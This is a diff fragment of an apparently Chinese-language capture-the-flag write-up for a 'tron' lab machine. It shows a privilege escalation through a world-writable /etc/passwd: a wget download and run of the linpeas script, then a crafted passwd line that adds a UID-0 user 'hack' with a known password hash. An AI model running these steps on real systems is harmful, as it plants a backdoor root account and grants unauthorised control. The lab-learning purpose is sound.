@@ -91,5 +91,19 @@ HMVMuserplayer2021
 player@tron:~$ ls /etc/passwd -al
 -rw-r--rw- 1 root root 1399 May  1  2021 /etc/passwd
 
+```
 
+下载知名豌豆扫描工具linpeas发现passwd 有写入权限，那么我们可以直接写入一个root权限的用户或者更改他的账号密码
+```css
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+```C
+mkpasswd -m sha-512 //123
+//把下面内容照着root的做修改成下面这样填入/etc/passwd
+hack:$6$hxYB19Bb/77OJemB$PMJiiXKU7y2OLCD5GGO2F1hQwgsSUjEX2FyoUsQhOw4L5WlJ/26EMca3gmyMSFXtBeo4JAj5uWwv6rq.O8M6x1:0:0:root:/root:/bin/bash
+
+su hack //123
 ```
